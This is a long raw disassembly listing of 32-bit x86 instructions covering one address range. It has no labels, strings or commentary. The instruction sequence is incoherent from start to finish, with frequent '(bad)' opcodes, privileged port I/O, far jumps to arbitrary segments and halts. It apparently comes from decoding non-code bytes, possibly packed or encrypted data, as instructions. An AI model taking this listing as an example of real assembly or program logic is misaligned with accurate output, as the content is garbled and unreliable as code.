  4132c7:	lods   eax,DWORD PTR ds:[esi]
  4132c8:	in     eax,dx
  4132c9:	push   ss
  4132ca:	xchg   bh,ch
  4132cc:	mov    ds:0xa7fac26a,eax
  4132d1:	pop    es
  4132d2:	add    dh,BYTE PTR [esi]
  4132d4:	pop    esp
  4132d5:	push   eax
  4132d6:	mov    dh,0x2c
  4132d8:	add    DWORD PTR [eax],edi
  4132da:	in     al,dx
  4132db:	xchg   edi,eax
  4132dc:	rol    BYTE PTR [ebx-0x5f],cl
  4132df:	ins    DWORD PTR es:[edi],dx
  4132e0:	xchg   esp,eax
  4132e1:	out    dx,al
  4132e2:	stos   BYTE PTR es:[edi],al
  4132e3:	inc    eax
  4132e4:	inc    ebx
  4132e5:	inc    esp
  4132e6:	ins    BYTE PTR es:[edi],dx
  4132e7:	iret   
  4132e8:	mov    WORD PTR [ecx+esi*4+0x46],es
  4132ec:	cmp    dl,ch
  4132ee:	in     eax,dx
  4132ef:	push   es
  4132f0:	and    eax,ebx
  4132f2:	pusha  
  4132f3:	cmp    ecx,DWORD PTR [esi+0x45]
  4132f6:	in     al,0xb8
  4132f8:	aam    0x2
  4132fa:	mov    bl,0x3c
  4132fc:	in     al,0xea
  4132fe:	fcom   st(0)
  413300:	shr    BYTE PTR [esi],0x38
  413303:	mov    cl,0x32
  413305:	xchg   esi,eax
  413306:	mov    ebx,0xa1a06da
  41330b:	push   eax
  41330c:	adc    al,0xc2
  41330e:	(bad)  
  41330f:	jae    0x413373
  413311:	into   
  413312:	push   esi
  413313:	cmp    eax,0x82ec2808
  413318:	mov    al,ds:0x5be84865
  41331d:	adc    DWORD PTR [eax-0x590ff570],edi
  413323:	inc    eax
  413324:	adc    ah,BYTE PTR [ebx+0x43]
  413327:	push   ebx
  413328:	adc    esi,eax
  41332a:	mov    ss,WORD PTR [eax+0x5e]
  41332d:	idiv   esi
  41332f:	xor    al,0xf9
  413331:	sub    bh,al
  413333:	imul   esp,DWORD PTR [eax-0x4b0b85f4],0xda56c70
  41333d:	sbb    eax,0x38684bf6
  413342:	jmp    DWORD PTR [edx]
  413344:	fcom   DWORD PTR ds:0xb342e686
  41334a:	add    eax,0xae1a320d
  41334f:	out    0x75,eax
  413351:	enter  0xc582,0x5a
  413355:	and    BYTE PTR [eax],dl
  413357:	loopne 0x413383
  413359:	sub    al,0xc0
  41335b:	jb     0x4133ce
  41335d:	push   eax
  41335e:	ret    
  41335f:	(bad)  
  413360:	pusha  
  413361:	mov    dl,0xec
  413363:	xor    ah,BYTE PTR [esp+esi*4-0x49]
  413367:	je     0x41339f
  413369:	stos   BYTE PTR es:[edi],al
  41336a:	test   BYTE PTR [eax+0x3d],0xcc
  41336e:	loopne 0x41330e
  413370:	push   0x5c
  413372:	dec    esp
  413373:	nop
  413374:	rcr    BYTE PTR [edi+0x35dac1b5],cl
  41337a:	cli    
  41337b:	cmp    BYTE PTR [edx-0x603761a2],0xc8
  413382:	test   al,0xf4
  413384:	ret    
  413385:	(bad)  
  413386:	inc    esp
  413387:	sbb    eax,0x88bc74b4
  41338c:	(bad)  
  41338d:	push   ss
  41338e:	imul   BYTE PTR [ebp+0x16fa00c2]
  413394:	ss jbe 0x4133fb
  413397:	fsubr  QWORD PTR [edx-0x11]
  41339a:	jle    0x4133fd
  41339c:	test   DWORD PTR [ecx+0x586a159a],ebp
  4133a2:	(bad)  
  4133a3:	pop    ecx
  4133a4:	rol    BYTE PTR [ebx+eax*1],0xa
  4133a8:	int    0xdf
  4133aa:	shl    BYTE PTR [esi-0x30],1
  4133ad:	add    BYTE PTR ds:[si+0xe7],bh
  4133b3:	out    dx,al
  4133b4:	je     0x413407
  4133b6:	adc    eax,0x40278ada
  4133bb:	ja     0x4133fd
  4133bd:	repz sub ebx,esp
  4133c0:	sbb    BYTE PTR [edx-0x15bc7976],0x6d
  4133c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133c8:	nop
  4133c9:	js     0x4133fd
  4133cb:	inc    edx
  4133cc:	mov    ss,edi
  4133ce:	xchg   ebp,eax
  4133cf:	mov    ch,0xd9
  4133d1:	jp     0x413370
  4133d3:	mov    al,ds:0xb8a56f2e
  4133d8:	repnz xor al,BYTE PTR [eax-0x6b]
  4133dc:	arpl   WORD PTR [edi-0x24],ax
  4133df:	jle    0x41344a
  4133e1:	call   0xdb81:0x50292aa8
  4133e8:	sub    dl,al
  4133ea:	xchg   edx,eax
  4133eb:	rcr    BYTE PTR fs:[ecx+eax*8],cl
  4133ef:	(bad)  
  4133f0:	(bad)  
  4133f1:	les    eax,FWORD PTR [eax-0x54]
  4133f4:	add    BYTE PTR [ebp+edi*4+0x77],bh
  4133f8:	jecxz  0x4133b9
  4133fa:	xor    al,0xf0
  4133fc:	out    dx,al
  4133fd:	mov    al,0x6e
  4133ff:	ds mov bl,0xa2
  413402:	add    BYTE PTR [edx-0x3c],dl
  413405:	add    BYTE PTR ds:0xb540abb6,bh
  41340b:	sub    al,BYTE PTR [ebx+0x7]
  41340e:	xchg   esi,eax
  41340f:	inc    edx
  413410:	push   0x28bee37a
  413415:	push   esp
  413416:	dec    ebp
  413417:	or     eax,0x30b63780
  41341c:	leave  
  41341d:	ret    0x76d0
  413420:	cmp    BYTE PTR [esi],al
  413422:	adc    dl,BYTE PTR [ecx]
  413424:	mov    edi,0x8d6e6816
  413429:	inc    ebp
  41342a:	sbb    eax,0xe084e242
  41342f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413430:	push   esi
  413431:	inc    ebp
  413432:	cmp    ebx,DWORD PTR [edx]
  413434:	or     al,0x1f
  413436:	push   esi
  413437:	pop    edi
  413438:	push   cs
  413439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41343a:	je     0x4133bc
  41343c:	test   BYTE PTR [ecx+0x13593653],ah
  413442:	add    al,0xfc
  413444:	into   
  413445:	imul   edi,DWORD PTR [eax-0x66104172],0x57
  41344c:	cld    
  41344d:	xchg   esp,eax
  41344e:	mov    eax,0x4146901c
  413453:	add    BYTE PTR [ebx],bl
  413455:	aad    0xd1
  413457:	adc    DWORD PTR [eax+0x1ead28aa],esi
  41345d:	pop    ecx
  41345e:	fwait
  41345f:	mov    esi,0x51a20f6
  413464:	ins    DWORD PTR es:[edi],dx
  413465:	push   ebp
  413466:	inc    esi
  413467:	mov    ah,BYTE PTR [ebx+0x2ac8883d]
  41346d:	retf   
  41346e:	cs test al,0xcd
  413471:	pop    edx
  413472:	cli    
  413473:	bound  eax,QWORD PTR [ebp-0x7d]
  413476:	pusha  
  413477:	jbe    0x413461
  413479:	mov    al,0x5f
  41347b:	ficom  DWORD PTR [eax]
  41347d:	or     esp,DWORD PTR [esi+0x4cb076a4]
  413483:	adc    dh,BYTE PTR [ebp+0x682aa8e9]
  413489:	inc    esp
  41348a:	xchg   edi,eax
  41348b:	sbb    bl,bl
  41348d:	test   dl,ch
  41348f:	nop
  413490:	js     0x4134d9
  413492:	imul   esi,DWORD PTR [edi-0x71c6014a],0xffffffbf
  413499:	lods   al,BYTE PTR ds:[esi]
  41349a:	lods   al,BYTE PTR ds:[esi]
  41349b:	add    BYTE PTR [edi+0x40],ah
  41349e:	enter  0xa2be,0x1e
  4134a2:	mov    esp,0x2468db36
  4134a7:	in     eax,dx
  4134a8:	and    DWORD PTR [eax],edx
  4134aa:	scas   eax,DWORD PTR es:[edi]
  4134ab:	out    dx,al
  4134ac:	jl     0x4134bf
  4134ae:	test   al,0x9e
  4134b0:	add    BYTE PTR [edx-0x77cf987c],cl
  4134b6:	rcl    BYTE PTR ds:0xbc248f15,0x66
  4134bd:	inc    esp
  4134be:	fmul   QWORD PTR [ecx+esi*4]
  4134c1:	mov    DWORD PTR [esi+0x7e02df68],ecx
  4134c7:	add    bl,BYTE PTR [edi+esi*1-0x3848598]
  4134ce:	pop    edi
  4134cf:	xor    edx,DWORD PTR [eax]
  4134d1:	dec    edx
  4134d2:	mov    BYTE PTR [edx],cl
  4134d4:	or     ebx,DWORD PTR [edi]
  4134d6:	imul   eax,DWORD PTR [eax],0xffffffdc
  4134d9:	jmp    0x4134db
  4134db:	pop    eax
  4134dc:	retf   
  4134dd:	ss cwde 
  4134df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134e0:	inc    esi
  4134e1:	push   esi
  4134e2:	outs   dx,BYTE PTR ds:[esi]
  4134e3:	sub    al,0x19
  4134e5:	or     cl,BYTE PTR [eax]
  4134e7:	add    eax,0x78b44a55
  4134ec:	xor    DWORD PTR [esi],0x834a5c7e
  4134f2:	push   0x66
  4134f4:	pusha  
  4134f5:	mov    edx,0xd1700432
  4134fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134fb:	jne    0x4134cf
  4134fd:	push   ss
  4134fe:	sbb    al,0x62
  413500:	mov    DWORD PTR [eax+0x4b001644],ecx
  413506:	mov    ah,0x2f
  413508:	mov    ds:0x1ccd4e59,al
  41350d:	in     al,0x3e
  41350f:	dec    eax
  413510:	push   edx
  413511:	sbb    eax,DWORD PTR [ebp+0x7c028682]
  413517:	xlat   BYTE PTR ds:[ebx]
  413518:	sahf   
  413519:	call   0x1a6b663c
  41351e:	or     BYTE PTR ds:0x413bcba,dl
  413524:	pop    es
  413525:	mov    eax,ds:0x4cc86205
  41352a:	pop    eax
  41352b:	dec    esi
  41352c:	mov    ch,0x71
  41352e:	pop    ds
  41352f:	pop    eax
  413530:	push   esp
  413531:	icebp  
  413532:	nop
  413533:	push   ecx
  413534:	push   ss
  413535:	out    dx,eax
  413536:	loopne 0x413503
  413538:	jmp    0xa29e6ae3
  41353d:	push   cs
  41353e:	or     DWORD PTR [edx],ecx
  413540:	xor    esp,eax
  413542:	fidiv  DWORD PTR [edi-0x53f1c565]
  413548:	mov    ds:0xf136b38e,al
  41354d:	sbb    al,0xa2
  41354f:	cmp    eax,0x87db605
  413554:	push   0xffffff80
  413556:	retf   0x34ba
  413559:	add    al,0xb4
  41355b:	ds inc edi
  41355d:	sub    esi,DWORD PTR [eax]
  41355f:	inc    ecx
  413560:	es push ds
  413562:	inc    esp
  413563:	or     ch,ah
  413565:	rcl    BYTE PTR [ebx],cl
  413567:	test   DWORD PTR fs:[edx+0x12],eax
  41356b:	mov    esp,0x74e6a66d
  413570:	push   ebp
  413571:	fadd   DWORD PTR [edx]
  413573:	js     0x41359a
  413575:	xchg   edx,eax
  413576:	push   ss
  413577:	or     bh,BYTE PTR [esi+edi*8]
  41357a:	ficom  WORD PTR [ebp+0x14]
  41357d:	push   ebp
  41357e:	adc    al,0xde
  413580:	pop    edx
  413581:	sar    BYTE PTR [ebp-0x5c],1
  413584:	test   esp,0x5111e88f
  41358a:	add    eax,0x7692735e
  41358f:	call   0xaa36:0x231257ac
  413596:	scas   eax,DWORD PTR es:[edi]
  413597:	clc    
  413598:	add    ah,ah
  41359a:	lods   eax,DWORD PTR ds:[esi]
  41359b:	rcl    DWORD PTR [esi+0x9],0xac
  41359f:	dec    esi
  4135a0:	or     BYTE PTR [ecx+0x22],dl
  4135a3:	clc    
  4135a4:	sub    eax,0xe3add846
  4135a9:	pop    es
  4135aa:	test   edx,ebx
  4135ac:	in     al,0xb6
  4135ae:	adc    al,BYTE PTR [eax]
  4135b0:	lahf   
  4135b1:	mov    BYTE PTR [ebp+0x15004bc0],dl
  4135b7:	call   0xc14d9215
  4135bc:	mov    al,0xa8
  4135be:	jmp    0xd66e3e1b
  4135c3:	inc    edx
  4135c4:	push   eax
  4135c5:	sub    eax,eax
  4135c7:	icebp  
  4135c8:	inc    ebx
  4135c9:	cmp    eax,0xb866ca6
  4135ce:	call   0x4e4215e9
  4135d3:	xor    eax,0x4cb32833
  4135d8:	xchg   BYTE PTR [edx],ah
  4135da:	pusha  
  4135db:	push   ecx
  4135dc:	inc    ebp
  4135dd:	mov    al,ds:0xad70215
  4135e2:	mov    al,0xa0
  4135e4:	pop    es
  4135e5:	adc    DWORD PTR [ebx+0x1cae31e2],ebx
  4135eb:	mov    al,BYTE PTR [edx-0x3f9554d2]
  4135f1:	sub    ah,BYTE PTR [edi*1+0x64787610]
  4135f8:	add    al,0x56
  4135fa:	(bad)  
  4135fc:	lods   eax,DWORD PTR ds:[esi]
  4135fd:	fdiv   st,st(5)
  4135ff:	push   edx
  413600:	hlt    
  413601:	xor    eax,DWORD PTR [eax]
  413603:	cmp    eax,esi
  413605:	add    BYTE PTR [ebp+0x36f4f473],ah
  41360b:	sub    ch,BYTE PTR [esi-0x4069a05c]
  413611:	cmp    ah,ah
  413613:	lods   al,BYTE PTR ds:[esi]
  413614:	jbe    0x4135d3
  413616:	cmp    ebp,DWORD PTR [edx-0x50f5d5d6]
  41361c:	loop   0x413623
  41361e:	or     al,0x84
  413620:	sub    ah,BYTE PTR [ecx]
  413622:	dec    ecx
  413623:	xlat   BYTE PTR ds:[ebx]
  413624:	mov    ah,BYTE PTR [ebx]
  413626:	add    dl,BYTE PTR [esi+0x6c434c56]
  41362c:	repnz rol BYTE PTR [esi-0x2bf9d55a],0xfa
  413634:	scas   al,BYTE PTR es:[edi]
  413635:	mov    esp,0x891693be
  41363a:	dec    esp
  41363b:	and    BYTE PTR [edx+0x78],ch
  41363e:	es cwde 
  413640:	or     BYTE PTR [esi],0x91
  413643:	inc    edi
  413644:	push   0xfffffffb
  413646:	mov    dh,0x1c
  413648:	das    
  413649:	dec    esp
  41364a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41364b:	xor    eax,0x428bedda
  413650:	(bad)  
  413651:	in     al,dx
  413652:	pushf  
  413653:	inc    edx
  413654:	pusha  
  413655:	xchg   BYTE PTR [edi],bl
  413657:	out    dx,al
  413658:	test   eax,0x150d8a09
  41365d:	mov    dl,0x69
  41365f:	push   eax
  413660:	sbb    edi,0xffffff82
  413663:	or     al,BYTE PTR ds:0x99a6468a
  413669:	fsub   QWORD PTR [esi-0x5e]
  41366c:	(bad)
  413670:	push   0xa
  413672:	shl    BYTE PTR [eax],cl
  413674:	cs pop ecx
  413676:	js     0x413622
  413678:	int3   
  413679:	add    al,0x44
  41367b:	adc    al,0xae
  41367d:	push   ds
  41367e:	stos   BYTE PTR es:[edi],al
  41367f:	xchg   BYTE PTR [ebx],ah
  413681:	add    BYTE PTR [ebx+0x74cc9abc],cl
  413687:	xchg   ebp,eax
  413688:	mov    al,0x76
  41368a:	jne    0x4136c1
  41368c:	fcom   DWORD PTR [edi+0x2702043c]
  413692:	mov    WORD PTR [eax+0x2cc7e7bc],?
  413698:	push   0x523acd8e
  41369d:	mov    edx,0xc5c4424c
  4136a2:	nop
  4136a3:	popf   
  4136a4:	push   0x58
  4136a6:	shr    DWORD PTR [esi+0x3abc5c2c],1
  4136ac:	mov    edx,0x17e5cb8
  4136b1:	add    BYTE PTR [ebx],0x1a
  4136b4:	xchg   edx,eax
  4136b5:	add    eax,0x96f85c9c
  4136ba:	pop    edx
  4136bb:	(bad)  
  4136bc:	retf   0xdeca
  4136bf:	lea    ebp,[edx]
  4136c1:	push   ss
  4136c2:	mov    DWORD PTR [edi+eiz*1],ebp
  4136c5:	and    ah,bh
  4136c7:	mov    esp,0x46a581f1
  4136cc:	mov    ds:0x4ec20ac1,eax
  4136d1:	inc    esp
  4136d2:	in     al,0x2b
  4136d4:	and    al,dl
  4136d6:	push   ds
  4136d7:	jmp    0xa69a:0x4c5ffaf5
  4136de:	stos   DWORD PTR es:[edi],eax
  4136df:	lds    eax,FWORD PTR ss:[edx]
  4136e2:	cld    
  4136e3:	xchg   DWORD PTR [esi-0x244fbae],eax
  4136e9:	and    al,0xfc
  4136eb:	add    BYTE PTR [edi+0x62],ch
  4136ee:	imul   edi,esi,0xffffffb7
  4136f1:	fadd   QWORD PTR [eax]
  4136f3:	loope  0x413767
  4136f5:	add    BYTE PTR [esi+0x1],ch
  4136f8:	mov    ?,edi
  4136fa:	xchg   ebp,eax
  4136fb:	nop
  4136fc:	sub    DWORD PTR [esi-0x27839b1],0x828dff0
  413706:	push   ebp
  413707:	and    ch,BYTE PTR [ebx-0x28]
  41370a:	je     0x413774
  41370c:	xor    DWORD PTR [eax+0x63],ebx
  41370f:	dec    edx
  413710:	outs   dx,BYTE PTR ds:[esi]
  413711:	xor    ebp,DWORD PTR [esi+edi*1-0x3cdee537]
  413718:	sti    
  413719:	dec    esi
  41371a:	mov    edx,fs
  41371c:	jmp    0xb641e4c7
  413721:	mov    eax,ds:0xbada73d0
  413726:	outs   dx,DWORD PTR ds:[esi]
  413727:	cmp    dl,BYTE PTR [edx+0x74]
  41372a:	jo     0x4136dc
  41372c:	lods   eax,DWORD PTR ds:[esi]
  41372d:	xor    cl,BYTE PTR [eax]
  41372f:	add    eax,0xc6a278c0
  413734:	push   ebp
  413735:	sahf   
  413736:	mov    bl,BYTE PTR [esi]
  413738:	or     DWORD PTR [ebx-0x226bdd78],ebx
  41373e:	not    al
  413740:	pop    ebp
  413741:	adc    al,0x61
  413743:	gs inc eax
  413745:	dec    esp
  413746:	cdq    
  413747:	fs cwde 
  413749:	call   0x5742:0xb6c0a2b6
  413750:	mov    es,WORD PTR [ebp-0x66]
  413753:	cs into 
  413755:	js     0x413717
  413757:	dec    esp
  413758:	xor    eax,0x5e5688d3
  41375d:	adc    DWORD PTR [esi],ebp
  41375f:	push   eax
  413760:	mov    eax,ds:0xb9ca8aa
  413765:	out    0xdb,al
  413767:	rol    BYTE PTR [esi+ebp*8],0xdf
  41376b:	pop    edx
  41376c:	ins    BYTE PTR es:[edi],dx
  41376d:	sub    bh,ah
  41376f:	fstp   QWORD PTR [esi+0x3b]
  413772:	mov    al,0x3a
  413774:	rcr    al,cl
  413776:	sub    BYTE PTR [edx],0x52
  413779:	dec    ebx
  41377a:	push   edx
  41377b:	mov    al,0x4b
  41377d:	and    dh,0x96
  413780:	lods   al,BYTE PTR ds:[esi]
  413781:	ins    BYTE PTR es:[edi],dx
  413782:	xchg   esi,eax
  413783:	inc    eax
  413784:	adc    ah,BYTE PTR [ebp+ebp*8-0x3a]
  413788:	mov    ds:0xd1aa82b5,al
  41378d:	push   esp
  41378e:	and    eax,0xd18ee630
  413793:	push   ss
  413794:	(bad)  [edx-0x2f3ebca6]
  41379a:	jb     0x413749
  41379c:	es mov ebp,0xa2423728
  4137a2:	aam    0x8a
  4137a4:	inc    esp
  4137a5:	sbb    edx,esp
  4137a7:	clc    
  4137a8:	mov    eax,ds:0x94a57a32
  4137ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137ae:	or     DWORD PTR [ebx],edi
  4137b0:	call   0x7316:0x6263c259
  4137b7:	fisubr WORD PTR [esp+eiz*8]
  4137ba:	dec    ebp
  4137bb:	sub    al,0x40
  4137bd:	hlt    
  4137be:	xor    cl,BYTE PTR [edi+0x708cecad]
  4137c4:	ret    
  4137c5:	xchg   esp,eax
  4137c6:	jns    0x41377b
  4137c8:	add    BYTE PTR [eax],dl
  4137ca:	out    dx,eax
  4137cb:	jmp    0x6d68:0x5e6b0046
  4137d2:	xchg   ebx,eax
  4137d3:	ret    
  4137d4:	retf   0xd7a0
  4137d7:	xor    eax,0x74ee3c5e
  4137dc:	jmp    0xf126907a
  4137e1:	push   ds
  4137e2:	retf   
  4137e3:	mov    ah,0x32
  4137e5:	push   edi
  4137e6:	pop    ds
  4137e7:	lea    eax,[ebp-0x4a]
  4137ea:	xchg   esp,eax
  4137eb:	scas   al,BYTE PTR es:[edi]
  4137ec:	and    eax,0xe4ca8cbe
  4137f1:	add    bh,cl
  4137f3:	mov    edx,0x69b0b1e
  4137f8:	pop    es
  4137f9:	call   0x38b7fb13
  4137fe:	fdiv   DWORD PTR [eax]
  413800:	or     DWORD PTR [edx-0x3f],ebp
  413803:	jbe    0x41387f
  413805:	xchg   BYTE PTR [ebx+0x10],al
  413808:	add    ebp,eax
  41380a:	pusha  
  41380b:	xchg   BYTE PTR [edx],dl
  41380d:	outs   dx,DWORD PTR ss:[esi]
  41380f:	jmp    0x231c:0xa8d250
  413816:	xchg   edx,eax
  413817:	add    BYTE PTR [ecx-0x2e784185],cl
  41381d:	push   cs
  41381e:	aam    0xa6
  413820:	mov    ds:0x7c887d72,eax
  413825:	fiadd  DWORD PTR ds:0xe8360497
  41382b:	stc    
  41382c:	test   BYTE PTR [edx+0x75c54e6f],0xb4
  413833:	pop    ebp
  413834:	sbb    eax,0xd0b6ab3c
  413839:	pop    eax
  41383a:	fs aam 0x9c
  41383d:	pop    ds
  41383e:	dec    ebp
  41383f:	cwde   
  413840:	rol    DWORD PTR [eax-0x1b7703a2],1
  413846:	and    BYTE PTR [eax],0x58
  413849:	fisubr WORD PTR [ebp+0x1d1c3c03]
  41384f:	not    bl
  413851:	pop    eax
  413852:	xchg   edx,eax
  413853:	mov    ds:0x6661f076,eax
  413858:	push   ss
  413859:	lock jp 0x413829
  41385c:	in     al,dx
  41385d:	push   edx
  41385e:	dec    ebx
  41385f:	rol    BYTE PTR [esi+0x3a34671d],1
  413865:	xchg   ecx,eax
  413866:	jne    0x413871
  413868:	mov    ch,0x55
  41386a:	call   0x4534:0xcc380667
  413871:	cmove  esp,DWORD PTR [edi-0x339db20e]
  413878:	fwait
  413879:	and    cl,dl
  41387b:	call   0xf58:0xb8ebaa0d
  413882:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413883:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413884:	sbb    eax,0x3a5283d8
  413889:	cmc    
  41388a:	out    dx,al
  41388b:	psrlw  mm1,QWORD PTR [ebx-0x6b]
  41388f:	aam    0x18
  413891:	jo     0x413821
  413893:	dec    ebx
  413894:	stos   DWORD PTR es:[edi],eax
  413895:	sub    BYTE PTR [eax],ch
  413897:	jb     0x41385f
  413899:	ds jae 0x4138cc
  41389c:	in     al,dx
  41389d:	inc    eax
  41389e:	bound  ebp,QWORD PTR [esi]
  4138a0:	mov    dh,0x8a
  4138a2:	add    esp,DWORD PTR [edx+0x25]
  4138a5:	shl    ah,0x11
  4138a8:	push   0x4c
  4138aa:	cli    
  4138ab:	add    ebp,DWORD PTR [ebp+0x5]
  4138ae:	std    
  4138af:	adc    esp,0xffffffe2
  4138b2:	ins    DWORD PTR es:[edi],dx
  4138b3:	sahf   
  4138b4:	pop    edx
  4138b5:	cwde   
  4138b6:	add    BYTE PTR [esi+0x2],bl
  4138b9:	and    DWORD PTR [eax+0x51],ebx
  4138bc:	jo     0x41384c
  4138be:	je     0x413850
  4138c0:	jns    0x413892
  4138c2:	out    0x14,al
  4138c4:	js     0x413907
  4138c6:	pop    ebx
  4138c7:	rcl    DWORD PTR [eax-0x1e],1
  4138ca:	jl     0x4138d4
  4138cc:	jmp    0x4138f6
  4138ce:	push   eax
  4138cf:	sbb    DWORD PTR [esp+eax*8],0x22550d7e
  4138d6:	xor    eax,0x186ea86a
  4138db:	jecxz  0x41385d
  4138dd:	push   ebx
  4138de:	or     ch,BYTE PTR [esi-0x35b94bf8]
  4138e4:	aaa    
  4138e5:	sbb    al,0x9
  4138e7:	mov    ah,0x2d
  4138e9:	push   es
  4138ea:	fcmovnbe st,st(4)
  4138ec:	ror    dl,1
  4138ee:	pushf  
  4138ef:	loopne 0x413881
  4138f1:	sbb    al,0x32
  4138f3:	mov    esp,0x45d0260a
  4138f8:	cmp    BYTE PTR [ecx-0x4601ab1e],al
  4138fe:	or     eax,0x4c11229a
  413903:	repnz mov bl,0xbe
  413906:	adc    esp,DWORD PTR [ebp-0x4f157d53]
  41390c:	pop    ecx
  41390d:	mov    ah,cl
  41390f:	lea    edi,[esi-0x18]
  413912:	add    al,0xf6
  413914:	fidiv  DWORD PTR [ecx]
  413916:	jle    0x413922
  413918:	push   cs
  413919:	inc    eax
  41391a:	jo     0x4138b0
  41391c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41391d:	mov    al,ds:0x4c16cde4
  413922:	push   ss
  413923:	jmp    0x2e3:0xb5b3d4f4
  41392a:	ds pusha 
  41392c:	mov    ds:0xc178e4b2,al
  413931:	mov    cs,WORD PTR [edi]
  413933:	jmp    0x4613708f
  413938:	push   es
  413939:	xchg   edi,eax
  41393a:	mov    BYTE PTR [edx+0x2aadcd02],bh
  413940:	mov    ds:0x1b827efb,al
  413945:	add    ch,BYTE PTR [esi]
  413947:	sub    DWORD PTR [edx],0x861c3876
  41394d:	lds    esp,FWORD PTR [ebx]
  41394f:	add    ecx,DWORD PTR [ebp+0xc]
  413952:	pop    es
  413953:	es inc esp
  413955:	adc    BYTE PTR [eax],0xd2
  413958:	push   esi
  413959:	hlt    
  41395a:	push   cs
  41395b:	inc    edx
  41395c:	hlt    
  41395d:	xchg   DWORD PTR [eax],eax
  41395f:	inc    edi
  413960:	fisub  DWORD PTR [ebx]
  413962:	adc    BYTE PTR [eax-0x7fec1eb0],0x5f
  413969:	cmp    bh,ch
  41396b:	mov    eax,ds:0xa8ce76a
  413970:	shl    ah,1
  413972:	add    BYTE PTR [esi-0x51],bl
  413975:	push   edx
  413976:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413977:	(bad)  
  413978:	(bad)  
  413979:	inc    ebx
  41397a:	arpl   WORD PTR [ecx],ax
  41397c:	sub    ah,BYTE PTR [edi+ebx*2-0x54]
  413980:	iret   
  413981:	ins    BYTE PTR es:[edi],dx
  413982:	fdiv   DWORD PTR [ebp-0x397d2657]
  413988:	or     al,0x4e
  41398a:	push   cs
  41398b:	mov    BYTE PTR [eax-0x682a5f5a],ah
  413991:	xor    BYTE PTR [ebp+0x2f1e54d0],0xe8
  413998:	fadd   DWORD PTR [esi+0x36c0b66]
  41399e:	or     BYTE PTR [ebx+0x29],ch
  4139a1:	call   0x800a:0xf42a6afc
  4139a8:	xlat   BYTE PTR ds:[ebx]
  4139a9:	rol    BYTE PTR [edx+0x1cca424a],cl
  4139af:	out    dx,al
  4139b0:	retf   0x6048
  4139b3:	(bad)  
  4139b4:	addr16 pop ds
  4139b6:	mov    eax,0xb168bc9
  4139bb:	pop    edx
  4139bc:	ss sub dh,ch
  4139bf:	movups xmm3,XMMWORD PTR [esi-0x55]
  4139c3:	mov    edx,0x2692342e
  4139c8:	sbb    al,0x38
  4139ca:	pop    ebx
  4139cb:	ret    
  4139cc:	adc    eax,0x89742784
  4139d1:	mov    al,0xfd
  4139d3:	or     dl,BYTE PTR [edx+0x436c3b63]
  4139d9:	rol    DWORD PTR [eax],0x1a
  4139dc:	ss ja  0x413a59
  4139df:	sahf   
  4139e0:	sbb    BYTE PTR [eax-0x4c],0xb1
  4139e4:	lods   eax,DWORD PTR ds:[esi]
  4139e5:	xor    DWORD PTR [ebp+0x42c4081d],esi
  4139eb:	inc    esi
  4139ec:	stos   BYTE PTR es:[edi],al
  4139ed:	lar    eax,WORD PTR [eax+0x51]
  4139f1:	push   edi
  4139f2:	aad    0x3c
  4139f4:	mov    edx,0xec65c25c
  4139f9:	push   ds
  4139fa:	lods   eax,DWORD PTR ds:[esi]
  4139fb:	sbb    eax,0x4798c8a1
  413a00:	test   BYTE PTR [ebp+0x64],dl
  413a03:	jmp    0x289ab796
  413a08:	call   0xfd3c16bd
  413a0d:	fdivr  st(6),st
  413a0f:	push   esp
  413a10:	add    al,0xbf
  413a12:	and    DWORD PTR [esp+edx*4],edx
  413a15:	scas   al,BYTE PTR es:[edi]
  413a16:	cwde   
  413a17:	fild   QWORD PTR [ecx+0x54]
  413a1a:	(bad)  
  413a1b:	shl    ecx,1
  413a1d:	add    dl,BYTE PTR [esi+eax*1-0x17928704]
  413a24:	push   esi
  413a25:	mov    ah,0x8e
  413a27:	mov    ah,BYTE PTR [ebx-0x48936e1e]
  413a2d:	sub    bh,dl
  413a2f:	dec    esp
  413a30:	add    BYTE PTR [eax-0x354a7a3a],bl
  413a36:	fs nop
  413a38:	outs   dx,DWORD PTR ds:[esi]
  413a39:	jl     0x413a49
  413a3b:	(bad)  
  413a3c:	and    DWORD PTR [eax-0x1e493aac],esi
  413a42:	pushf  
  413a43:	dec    esp
  413a44:	jne    0x413a7a
  413a46:	rcl    esi,1
  413a48:	nop
  413a49:	dec    edi
  413a4a:	pop    esi
  413a4b:	fld    QWORD PTR [edx+ebp*4+0x1660aaf4]
  413a52:	inc    ebp
  413a53:	or     eax,0x6310ad15
  413a58:	push   edx
  413a59:	fstp   QWORD PTR [edx+0x740cda07]
  413a5f:	xchg   DWORD PTR [eax-0x3fafa10],esi
  413a65:	mov    al,0xba
  413a67:	retf   
  413a68:	mov    DWORD PTR [eax],eax
  413a6a:	push   edx
  413a6b:	jg     0x413a18
  413a6d:	sub    dh,BYTE PTR [edx+0x7c]
  413a70:	mov    esi,0x4ae42259
  413a75:	gs or  al,0x3b
  413a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a79:	dec    eax
  413a7a:	int    0x2
  413a7c:	pop    edx
  413a7d:	fmul   DWORD PTR [esi+0x68855edf]
  413a83:	(bad)  
  413a84:	mov    al,0x7d
  413a86:	dec    eax
  413a87:	mov    edi,0x26a60a70
  413a8c:	mov    WORD PTR [esi],gs
  413a8e:	push   edx
  413a8f:	jl     0x413af1
  413a91:	inc    ecx
  413a92:	xchg   edi,eax
  413a93:	inc    ecx
  413a94:	mov    ch,BYTE PTR [esi-0x37]
  413a97:	ins    BYTE PTR es:[edi],dx
  413a98:	inc    eax
  413a99:	icebp  
  413a9a:	pop    ecx
  413a9b:	sub    dh,BYTE PTR [eax]
  413a9d:	adc    eax,0x9c9a3494
  413aa2:	dec    ebp
  413aa3:	inc    ebx
  413aa4:	xlat   BYTE PTR ds:[ebx]
  413aa5:	sub    ebp,DWORD PTR [edx+0x474e5fe]
  413aab:	push   edi
  413aac:	into   
  413aad:	lahf   
